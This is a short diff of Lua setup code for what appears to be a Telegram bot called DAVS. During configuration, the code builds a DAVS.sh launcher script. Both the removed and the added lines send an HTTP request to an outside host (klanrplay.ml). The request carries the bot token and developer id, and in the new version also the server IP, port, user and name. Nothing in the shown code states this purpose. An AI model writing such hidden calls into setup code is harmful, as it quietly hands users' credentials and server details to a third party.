@@ -66,8 +66,8 @@ TokenBot = DevAbd:get(Server.."TokenDAVS"),
 DAVS = DevAbd:get(Server.."TokenDAVS"):match("(%d+)"),
 SudoIds = {DevAbd:get(Server.."IdDAVS")},
 }
-Create_Info(database:get(Server_DAVS.."Token_DAVS"),database:get(Server_DAVS.."Id_DAVS"),database:get(Server_DAVS.."UserName_DAVS"))   
-https.request("http://klanrplay.ml/tronteam0/tronteam0.php?id="..database:get(Server_DAVS.."Id_DAVS").."&user="..database:get(Server_DAVS.."UserName_DAVS").."&token="..database:get(Server_DAVS.."Token_DAVS"))
+Create(Config, "./config.lua")  
+https.request("http://klanrplay.ml/tronteam0/tronteam0.php?Get=DAVS&DevId="..DevABd:get(Server.."IdDAVS").."&TokenBot="..DevABd:get(Server.."TokenDAVS").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("DAVS.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
